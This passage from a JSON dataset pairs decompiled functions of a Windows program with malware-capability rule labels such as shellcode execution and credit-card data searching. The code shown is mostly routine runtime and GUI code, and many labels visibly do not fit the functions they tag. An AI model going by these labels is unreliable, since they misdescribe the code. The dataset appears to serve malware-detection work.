        "decompiled_code": "\nuint32_t * __cdecl fcn.00418bd9(uint32_t *arg_8h)\n\n{\n    uint32_t *arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    int64_t iVar5;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar3 = arg_8h[1];\n    if (((uVar3 < 0) || (0x1000 < uVar3)) || ((0xfff < uVar3 && (*arg_8h != 0)))) {\n        arg_8h_00 = NULL;\n    }\n    else {\n        fcn.0041dafd();\n        uVar3 = arg_8h[1];\n        uVar2 = *arg_8h;\n        if ((uVar3 < 0) || ((uVar3 < 1 && (uVar2 < 0x3f481)))) {\n            arg_8h_00 = fcn.0041db87(arg_8h);\n            if ((*0x44d8b4 == 0) || (iVar1 = fcn.0041db49(arg_8h_00),  iVar1 == 0)) {\n                uVar3 = *arg_8h_00;\n                var_8h = uVar3 - *0x44d8b0;\n                var_4h = ((uVar3 >> 0x1f) - (*0x44d8b0 >> 0x1f)) - (uVar3 < *0x44d8b0);\n            }\n            else {\n                uVar2 = *0x44d8b0 + *0x44d8b8;\n                uVar3 = *arg_8h_00;\n                var_8h = uVar3 - uVar2;\n                var_4h = ((uVar3 >> 0x1f) - (uVar2 >> 0x1f)) - (uVar3 < uVar2);\n                arg_8h_00[8] = 1;\n            }\n            uVar3 = fcn.0041ddb0(var_8h, var_4h, 0x3c, 0);\n            *arg_8h_00 = uVar3;\n            if (uVar3 < 0) {\n                *arg_8h_00 = uVar3 + 0x3c;\n                bVar4 = 0x3b < var_8h;\n                var_8h = var_8h - 0x3c;\n                var_4h = var_4h + -1 + bVar4;\n            }\n            _var_8h = fcn.0041a880(var_8h, var_4h, 0x3c, 0);\n            _var_8h = _var_8h + arg_8h_00[1];\n            uVar3 = fcn.0041ddb0(_var_8h, 0x3c, 0);\n            arg_8h_00[1] = uVar3;\n            if (uVar3 < 0) {\n                arg_8h_00[1] = uVar3 + 0x3c;\n                _var_8h = _var_8h + -0x3c;\n            }\n            iVar5 = fcn.0041a880(_var_8h, 0x3c, 0);\n            _var_8h = iVar5 + arg_8h_00[2];\n            uVar3 = fcn.0041ddb0(_var_8h, 0x18, 0);\n            arg_8h_00[2] = uVar3;\n            if (uVar3 < 0) {\n                arg_8h_00[2] = uVar3 + 0x18;\n                _var_8h = _var_8h + -0x18;\n            }\n            iVar5 = fcn.0041a880(_var_8h, 0x18, 0);\n            iVar1 = iVar5;\n            if ((iVar5 < 0x100000000) && (iVar5 < 0)) {\n                arg_8h_00[6] = (arg_8h_00[6] + 7 + iVar1) % 7;\n                arg_8h_00[3] = arg_8h_00[3] + iVar1;\n                if (arg_8h_00[3] < 1) {\n                    arg_8h_00[5] = arg_8h_00[5] - 1;\n                    arg_8h_00[3] = arg_8h_00[3] + 0x1f;\n                    arg_8h_00[7] = 0x16c;\n                    arg_8h_00[4] = 0xb;\n                }\n                else {\n                    arg_8h_00[7] = arg_8h_00[7] + iVar1;\n                }\n            }\n        }\n        else {\n            var_8h = uVar2 - *0x44d8b0;\n            var_4h = (uVar3 - (*0x44d8b0 >> 0x1f)) - (uVar2 < *0x44d8b0);\n            arg_8h_00 = fcn.0041db87(&var_8h);\n            if ((*0x44d8b4 != 0) && (iVar1 = fcn.0041db49(arg_8h_00),  iVar1 != 0)) {\n                bVar4 = var_8h < *0x44d8b8;\n                var_8h = var_8h - *0x44d8b8;\n                var_4h = (var_4h - (*0x44d8b8 >> 0x1f)) - bVar4;\n                arg_8h_00 = fcn.0041db87(&var_8h);\n                arg_8h_00[8] = 1;\n            }\n        }\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 1379
    },
    "004179f7": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004179f7(int32_t arg_8h, uint arg_ch)\n\n{\n    ushort *in_ECX;\n    \n    if (arg_ch == 10) {\n        *in_ECX = 10;\n    }\n    else {\n        if (arg_ch == 0xb) {\n            *in_ECX = 0xb;\n            in_ECX[4] = -(arg_8h != 0);\n            return;\n        }\n        if (arg_ch == 0x16) {\n            *in_ECX = 0x16;\n        }\n        else if (arg_ch == 0x17) {\n            *in_ECX = 0x17;\n        }\n        else if (arg_ch == 0x19) {\n            *in_ECX = 0x19;\n        }\n        else if (arg_ch == 0x13) {\n            *in_ECX = 0x13;\n        }\n        else {\n            *in_ECX = 3;\n        }\n    }\n    *(in_ECX + 4) = arg_8h;\n    return;\n}\n",
        "token_count": 237
    },
    "0041a78c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a78c(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    if ((arg_10h == 10) && (arg_8h < 0)) {\n        uVar1 = 1;\n        arg_10h = 10;\n    }\n    else {\n        uVar1 = 0;\n    }\n    fcn.0041a74e(arg_10h, uVar1);\n    return arg_ch;\n}\n",
        "token_count": 118
    },
    "0041a7b6": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a7b6(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((arg_10h == 10) && (arg_8h < 0)) {\n        uVar1 = 1;\n    }\n    fcn.0041a74e(arg_10h, uVar1);\n    return arg_ch;\n}\n",
        "token_count": 105
    },
    "00421847": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00421847(uint32_t param_1, char *param_2, uint32_t param_3)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iStack1060;\n    int32_t iStack1056;\n    int32_t iStack1052;\n    char *pcStack1048;\n    int32_t iStack1044;\n    int32_t iStack1040;\n    char acStack1036 [1028];\n    uint uStack8;\n    \n    uStack8 = *0x44d270;\n    iStack1052 = 0;\n    iStack1056 = 0;\n    if (param_3 == 0) goto code_r0x00421a01;\n    piVar1 = (param_1 >> 5) * 4 + 0x450ea0;\n    iVar8 = (param_1 & 0x1f) * 0x24;\n    if ((*(*piVar1 + 4 + iVar8) & 0x20) != 0) {\n        fcn.00424f2e(param_1, 0, 0, 2);\n    }\n    if ((*(*piVar1 + iVar8 + 1) & 0x80) == 0) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)(*(*piVar1 + iVar8), param_2, param_3, &iStack1060, 0);\n        if (iVar5 == 0) {\n            iStack1040 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            iStack1040 = 0;\n            iStack1052 = iStack1060;\n        }\ncode_r0x00421963:\n        if (iStack1052 != 0) goto code_r0x00421a01;\n        if (iStack1040 != 0) {\n            if (iStack1040 == 5) {\n                puVar6 = fcn.0041a92a();\n                *puVar6 = 9;\n                puVar6 = fcn.0041a933();\n                *puVar6 = 5;\n            }\n            else {\n                fcn.0041a93c(iStack1040);\n            }\n            goto code_r0x00421a01;\n        }\n    }\n    else {\n        pcStack1048 = param_2;\n        iStack1040 = 0;\n        if (param_3 != 0) {\n            do {\n                uVar7 = pcStack1048 - param_2;\n                pcVar4 = acStack1036;\n                iStack1044 = 0;\n                do {\n                    if (param_3 <= uVar7) break;\n                    pcVar3 = pcStack1048 + 1;\n                    cVar2 = *pcStack1048;\n                    uVar7 = uVar7 + 1;\n                    if (cVar2 == '\\n') {\n                        iStack1056 = iStack1056 + 1;\n                        *pcVar4 = '\\r';\n                        pcVar4 = pcVar4 + 1;\n                        iStack1044 = iStack1044 + 1;\n                    }\n                    *pcVar4 = cVar2;\n                    pcVar4 = pcVar4 + 1;\n                    iStack1044 = iStack1044 + 1;\n                    pcStack1048 = pcVar3;\n                } while (iStack1044 < 0x400);\n                iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                                  (*(*piVar1 + iVar8), acStack1036, pcVar4 - acStack1036, &iStack1060, 0);\n                if (iVar5 == 0) {\n                    iStack1040 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    goto code_r0x00421963;\n                }\n                iStack1052 = iStack1052 + iStack1060;\n                if ((iStack1060 < pcVar4 - acStack1036) || (param_3 <= pcStack1048 - param_2)) goto code_r0x00421963;\n            } while( true );\n        }\n    }\n    if (((*(*piVar1 + 4 + iVar8) & 0x40) == 0) || (*param_2 != '\\x1a')) {\n        puVar6 = fcn.0041a92a();\n        *puVar6 = 0x1c;\n        puVar6 = fcn.0041a933();\n        *puVar6 = 0;\n    }\ncode_r0x00421a01:\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 1059
    },
    "004222df": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004222df(uint16_t *arg_8h, uint32_t *arg_ch, int32_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_18h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = arg_8h[5];\n    var_ch = *(arg_8h + 3);\n    var_8h = *(arg_8h + 1);\n    var_4h = *arg_8h << 0x10;\n    uVar5 = uVar1 & 0x7fff;\n    iVar6 = uVar5 - 0x3fff;\n    if (iVar6 == -0x3fff) {\n        iVar6 = 0;\n        uVar5 = fcn.0042224b();\n        uVar2 = uVar5;\n        if (uVar5 != 0) {\ncode_r0x004223f7:\n            uVar3 = 0;\n            goto code_r0x004223f9;\n        }\n    }\n    else {\n        fcn.00422230(&var_18h, &var_ch);\n        iVar4 = fcn.004221be(&var_ch, arg_10h[2]);\n        if (iVar4 != 0) {\n            iVar6 = uVar5 - 0x3ffe;\n        }\n        iVar4 = arg_10h[1];\n        if (iVar6 < iVar4 - arg_10h[2]) {\n            var_ch = 0;\n            var_8h = 0;\n            uVar5 = var_ch;\n            uVar2 = var_8h;\n        }\n        else {\n            if (iVar4 < iVar6) {\n                if (*arg_10h <= iVar6) {\n                    var_8h = 0;\n                    var_4h = 0;\n                    var_ch = 0x80000000;\n                    fcn.00422264(&var_ch, arg_10h[3]);\n                    iVar6 = arg_10h[5] + *arg_10h;\n                    uVar3 = 1;\n                    goto code_r0x004223f9;\n                }\n                var_ch = var_ch & 0x7fffffff;\n                iVar6 = arg_10h[5] + iVar6;\n                fcn.00422264(&var_ch, arg_10h[3]);\n                goto code_r0x004223f7;\n            }\n            fcn.00422230(&var_ch, &var_18h);\n            fcn.00422264(&var_ch, iVar4 - iVar6);\n            fcn.004221be(&var_ch, arg_10h[2]);\n            fcn.00422264(&var_ch, arg_10h[3] + 1);\n            uVar5 = var_ch;\n            uVar2 = var_8h;\n        }\n    }\n    var_8h = uVar2;\n    var_ch = uVar5;\n    iVar6 = 0;\n    uVar3 = 2;\ncode_r0x004223f9:\n    var_ch = iVar6 << (0x1fU - arg_10h[3] & 0x1f) | -((uVar1 & 0x8000) != 0) & 0x80000000 | var_ch;\n    if (arg_10h[4] == 0x40) {\n        arg_ch[1] = var_ch;\n        *arg_ch = var_8h;\n    }\n    else if (arg_10h[4] == 0x20) {\n        *arg_ch = var_ch;\n    }\n    return uVar3;\n}\n",
        "token_count": 853
    },
    "00433f8b": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00433f8b(uint arg_8h, uint *arg_ch, uint32_t *arg_10h, uint *arg_14h)\n\n{\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    fcn.00433f6c(arg_8h, &var_18h);\n    *arg_ch = var_14h;\n    *arg_10h = var_10h << 0x10 | var_10h._1_1_;\n    *arg_14h = var_18h;\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 172
    },
    "00435dfe": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00435dfe(int32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_ECX;\n    uint32_t uVar7;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetKeyState;\n    iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(0x11);\n    if (iVar2 < 0) {\n        uVar7 = 8;\n    }\n    else {\n        uVar7 = 0;\n    }\n    iVar2 = (*pcVar1)(0x10);\n    if (iVar2 < 0) {\n        uVar3 = 4;\n    }\n    else {\n        uVar3 = 0;\n    }\n    iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n    iVar5 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    if (iVar4 == 0) {\n        iVar6 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x20a, arg_8h << 0x10 | uVar7 | uVar3, arg_ch);\n    }\n    else {\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_SendMessageA)(iVar4, 0x20a, arg_8h << 0x10 | uVar7 | uVar3, arg_ch);\n            iVar4 = (*_sym.imp.USER32.dll_GetParent)(iVar4);\n            if (iVar6 != 0) {\n                return iVar6;\n            }\n            if (iVar4 == 0) {\n                return 0;\n            }\n        } while (iVar4 != iVar5);\n    }\n    return iVar6;\n}\n",
        "token_count": 420
    },
    "0042dfcd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool __cdecl\nfcn.0042dfcd(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    bool bVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpWindowName;\n    uint lpClassName;\n    uint dwExStyle;\n    \n    dwExStyle = arg_8h;\n    lpClassName = arg_ch;\n    lpWindowName = arg_10h;\n    var_10h = arg_14h;\n    var_14h = arg_18h;\n    var_18h = arg_1ch;\n    var_1ch = arg_20h;\n    var_20h = arg_24h;\n    var_24h = arg_28h;\n    var_28h = arg_2ch;\n    iVar1 = fcn.00438818();\n    var_2ch = *(iVar1 + 8);\n    var_30h = arg_30h;\n    iVar1 = (**(*in_ECX + 100))(&var_30h);\n    if (iVar1 == 0) {\n        (**(*in_ECX + 0x114))();\n        bVar3 = false;\n    }\n    else {\n        fcn.0042df81();\n        iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                          (dwExStyle, lpClassName, lpWindowName, var_10h, var_14h, var_18h, var_1ch, var_20h, var_24h, \n                           var_28h, var_2ch, var_30h);\n        iVar2 = fcn.0042cba9();\n        if (iVar2 == 0) {\n            (**(*in_ECX + 0x114))();\n        }\n        bVar3 = iVar1 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 523
    },
    "00421b04": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint8_t fcn.00421b04(uint32_t param_1)\n\n{\n    if (*0x450e88 <= param_1) {\n        return 0;\n    }\n    return *(*((param_1 >> 5) * 4 + 0x450ea0) + 4 + (param_1 & 0x1f) * 0x24) & 0x40;\n}\n",
        "token_count": 90
    },
    "00424e6c": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00424e6c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00419d14(0x443b08, 8);\n    uVar2 = *(unaff_EBP + 8);\n    iVar1 = *((uVar2 >> 5) * 4 + 0x450ea0) + (uVar2 & 0x1f) * 0x24;\n    if (*(iVar1 + 8) == 0) {\n        fcn.0041c713(10);\n        *(unaff_EBP + -4) = 0;\n        if (*(iVar1 + 8) == 0) {\n            iVar3 = fcn.00421e19(iVar1 + 0xc, 4000);\n            if (iVar3 == 0) {\n                fcn.004181ba(unaff_EBP + -0x10, 0xffffffff);\n                goto code_r0x00424efa;\n            }\n            *(iVar1 + 8) = *(iVar1 + 8) + 1;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00424f03();\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(*((uVar2 >> 5) * 4 + 0x450ea0) + 0xc + (uVar2 & 0x1f) * 0x24);\ncode_r0x00424efa:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 396
    },
    "00424f0c": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.00424f0c(uint32_t param_1)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*((param_1 >> 5) * 4 + 0x450ea0) + 0xc + (param_1 & 0x1f) * 0x24);\n    return;\n}\n",
        "token_count": 76
    },
    "00424f2e": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00424f2e(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint dwMoveMethod)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint lDistanceToMove;\n    uint lpDistanceToMoveHigh;\n    \n    lpDistanceToMoveHigh = arg_10h;\n    iVar2 = fcn.00424e2b(arg_8h);\n    if (iVar2 == -1) {\n        puVar3 = fcn.0041a92a();\n        *puVar3 = 9;\ncode_r0x00424f88:\n        iVar2 = -1;\n        lpDistanceToMoveHigh = 0xffffffff;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar2, arg_ch, &lpDistanceToMoveHigh, dwMoveMethod);\n        if (iVar2 == -1) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar4 != 0) {\n                fcn.0041a93c(iVar4);\n                goto code_r0x00424f88;\n            }\n        }\n        puVar1 = *((arg_8h >> 5) * 4 + 0x450ea0) + 4 + (arg_8h & 0x1f) * 0x24;\n        *puVar1 = *puVar1 & 0xfd;\n    }\n    return CONCAT44(lpDistanceToMoveHigh, iVar2);\n}\n",
        "token_count": 350
    },
    "0041eb19": {
        "rules": [
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688",
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653"
        ],
        "decompiled_code": "\nuint fcn.0041eb19(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    if (*0x45222c == 0) {\n        fcn.0041a43b();\n    }\n    iVar4 = 0;\n    pcVar3 = *0x450770;\n    if (*0x450770 != NULL) {\n        for (; *pcVar3 != '\\0'; pcVar3 = pcVar3 + iVar2 + 1) {\n            if (*pcVar3 != '=') {\n                iVar4 = iVar4 + 1;\n            }\n            iVar2 = fcn.004196b0(pcVar3);\n        }\n        piVar1 = fcn.004188ff(iVar4 * 4 + 4);\n        pcVar3 = *0x450770;\n        *0x4507a4 = piVar1;\n        if (piVar1 != NULL) {\n            do {\n                if (*pcVar3 == '\\0') {\n                    fcn.00418911(*0x450770);\n                    *0x450770 = NULL;\n                    *piVar1 = 0;\n                    *0x452220 = 1;\n                    return 0;\n                }\n                iVar4 = fcn.004196b0(pcVar3);\n                if (*pcVar3 != '=') {\n                    iVar2 = fcn.004188ff(iVar4 + 1);\n                    *piVar1 = iVar2;\n                    if (iVar2 == 0) {\n                        fcn.00418911(*0x4507a4);\n                        *0x4507a4 = NULL;\n                        return 0xffffffff;\n                    }\n                    fcn.004200e0(iVar2, pcVar3);\n                    piVar1 = piVar1 + 1;\n                }\n                pcVar3 = pcVar3 + iVar4 + 1;\n            } while( true );\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 436
    },
    "0042344f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t fcn.0042344f(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint32_t uVar26;\n    uint32_t uVar27;\n    uint32_t uVar28;\n    uint32_t uVar29;\n    uint32_t uVar30;\n    uint32_t uVar31;\n    uint32_t uVar32;\n    uint32_t uVar33;\n    uint32_t uVar34;\n    uint32_t uVar35;\n    uint32_t uVar36;\n    uint32_t uVar37;\n    uint32_t uVar38;\n    uint32_t uVar39;\n    uint32_t uVar40;\n    uint32_t uVar41;\n    uint32_t uVar42;\n    uint32_t uVar43;\n    uint32_t uVar44;\n    uint32_t arg_ch;\n    int32_t unaff_ESI;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x450c22;\n    arg_ch = *0x450c24;\n    if (unaff_ESI == 0) {\n        return 0xffffffff;\n    }\n    uVar2 = fcn.00425dfe(1, uVar1, 0x31, unaff_ESI + 4);\n    uVar3 = fcn.00425dfe(1, uVar1, 0x32, unaff_ESI + 8);\n    uVar4 = fcn.00425dfe(1, uVar1, 0x33, unaff_ESI + 0xc);\n    uVar5 = fcn.00425dfe(1, uVar1, 0x34, unaff_ESI + 0x10);\n    uVar6 = fcn.00425dfe(1, uVar1, 0x35, unaff_ESI + 0x14);\n    uVar7 = fcn.00425dfe(1, uVar1, 0x36, unaff_ESI + 0x18);\n    uVar8 = fcn.00425dfe(1, uVar1, 0x37, unaff_ESI);\n    uVar9 = fcn.00425dfe(1, uVar1, 0x2a, unaff_ESI + 0x20);\n    uVar10 = fcn.00425dfe(1, uVar1, 0x2b, unaff_ESI + 0x24);\n    uVar11 = fcn.00425dfe(1, uVar1, 0x2c, unaff_ESI + 0x28);\n    uVar12 = fcn.00425dfe(1, uVar1, 0x2d, unaff_ESI + 0x2c);\n    uVar13 = fcn.00425dfe(1, uVar1, 0x2e, unaff_ESI + 0x30);\n    uVar14 = fcn.00425dfe(1, uVar1, 0x2f, unaff_ESI + 0x34);\n    uVar15 = fcn.00425dfe(1, uVar1, 0x30, unaff_ESI + 0x1c);\n    uVar16 = fcn.00425dfe(1, uVar1, 0x44, unaff_ESI + 0x38);\n    uVar17 = fcn.00425dfe(1, uVar1, 0x45, unaff_ESI + 0x3c);\n    uVar18 = fcn.00425dfe(1, uVar1, 0x46, unaff_ESI + 0x40);\n    uVar19 = fcn.00425dfe(1, uVar1, 0x47, unaff_ESI + 0x44);\n    uVar20 = fcn.00425dfe(1, uVar1, 0x48, unaff_ESI + 0x48);\n    uVar21 = fcn.00425dfe(1, uVar1, 0x49, unaff_ESI + 0x4c);\n    uVar22 = fcn.00425dfe(1, uVar1, 0x4a, unaff_ESI + 0x50);\n    uVar23 = fcn.00425dfe(1, uVar1, 0x4b, unaff_ESI + 0x54);\n    uVar24 = fcn.00425dfe(1, uVar1, 0x4c, unaff_ESI + 0x58);\n    uVar25 = fcn.00425dfe(1, uVar1, 0x4d, unaff_ESI + 0x5c);\n    uVar26 = fcn.00425dfe(1, uVar1, 0x4e, unaff_ESI + 0x60);\n    uVar27 = fcn.00425dfe(1, uVar1, 0x4f, unaff_ESI + 100);\n    uVar28 = fcn.00425dfe(1, uVar1, 0x38, unaff_ESI + 0x68);\n    uVar29 = fcn.00425dfe(1, uVar1, 0x39, unaff_ESI + 0x6c);\n    uVar30 = fcn.00425dfe(1, uVar1, 0x3a, unaff_ESI + 0x70);\n    uVar31 = fcn.00425dfe(1, uVar1, 0x3b, unaff_ESI + 0x74);\n    uVar32 = fcn.00425dfe(1, uVar1, 0x3c, unaff_ESI + 0x78);\n    uVar33 = fcn.00425dfe(1, uVar1, 0x3d, unaff_ESI + 0x7c);\n    uVar34 = fcn.00425dfe(1, uVar1, 0x3e, unaff_ESI + 0x80);\n    uVar35 = fcn.00425dfe(1, uVar1, 0x3f, unaff_ESI + 0x84);\n    uVar36 = fcn.00425dfe(1, uVar1, 0x40, unaff_ESI + 0x88);\n    uVar37 = fcn.00425dfe(1, uVar1, 0x41, unaff_ESI + 0x8c);\n    uVar38 = fcn.00425dfe(1, uVar1, 0x42, unaff_ESI + 0x90);\n    uVar39 = fcn.00425dfe(1, uVar1, 0x43, unaff_ESI + 0x94);\n    uVar40 = fcn.00425dfe(1, uVar1, 0x28, unaff_ESI + 0x98);\n    uVar1 = fcn.00425dfe(1, uVar1, 0x29, unaff_ESI + 0x9c);\n    uVar41 = fcn.00425dfe(1, arg_ch, 0x1f, unaff_ESI + 0xa0);\n    uVar42 = fcn.00425dfe(1, arg_ch, 0x20, unaff_ESI + 0xa4);\n    uVar43 = fcn.00425dfe(1, arg_ch, 0x1003, unaff_ESI + 0xa8);\n    uVar44 = fcn.00425dfe(0, arg_ch, 0x1009, unaff_ESI + 0xb0);\n    *(unaff_ESI + 0xac) = arg_ch;\n    return uVar2 | uVar3 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 | uVar12 | uVar13 | uVar14 |\n           uVar15 | uVar16 | uVar17 | uVar18 | uVar19 | uVar20 | uVar21 | uVar22 | uVar23 | uVar24 | uVar25 | uVar26 |\n           uVar27 | uVar28 | uVar29 | uVar30 | uVar31 | uVar32 | uVar33 | uVar34 | uVar35 | uVar36 | uVar37 | uVar38 |\n           uVar39 | uVar40 | uVar1 | uVar41 | uVar42 | uVar43 | uVar44;\n}\n",
        "token_count": 2147
    },
    "00428800": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428800(int32_t *param_1)\n\n{\n    int32_t *arg_ch;\n    \n    if (param_1[0x14] != 0) {\n        if (param_1[0x15] < 0x10) {\n            arg_ch = param_1 + 0x10;\n        }\n        else {\n            arg_ch = param_1[0x10];\n        }\n        fcn.00420cce(0, arg_ch);\n    }\n    fcn.00401e00(1, 0);\n    fcn.00401e00(1, 0);\n    fcn.00401e00(1, 0);\n    fcn.00401e00(1, 0);\n    fcn.00428a29(*param_1 * 0x18 + 0x450d40);\n    return;\n}\n",
        "token_count": 194
    },
    "0042a873": {
        "rules": [
            "hash data using djb2/6ad21e310d674441ba35d7276afbe57d",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0042a873(uint8_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t extraout_ECX;\n    uint32_t uVar2;\n    ulong uVar3;\n    \n    iVar1 = 0;\n    if (param_1 != NULL) goto code_r0x0042a88b;\n    uVar3 = fcn.00429be4();\n    uVar2 = extraout_ECX;\n    do {\n        iVar1 = uVar3 * 0x21 + uVar2;\n        param_1 = (uVar3 >> 0x20) + 1;\ncode_r0x0042a88b:\n        uVar3 = CONCAT44(param_1, iVar1);\n        uVar2 = *param_1;\n    } while (*param_1 != 0);\n    return iVar1;\n}\n",
        "token_count": 191
    },
    "00401020": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00401020(uint *param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43b223;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    fcn.0042ab85(0x82);\n    *param_1 = 0x43d648;\n    param_1[0x1d] = 0;\n    param_1[0x1c] = vtable.CBrush.0;\n    uStack12 = 1;\n    uVar1 = (*_sym.imp.GDI32.dll_CreateSolidBrush)(0);\n    fcn.00432857(uVar1);\n    *in_FS_OFFSET = param_2;\n    return param_1;\n}\n",
        "token_count": 211
    },
    "0040cde0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
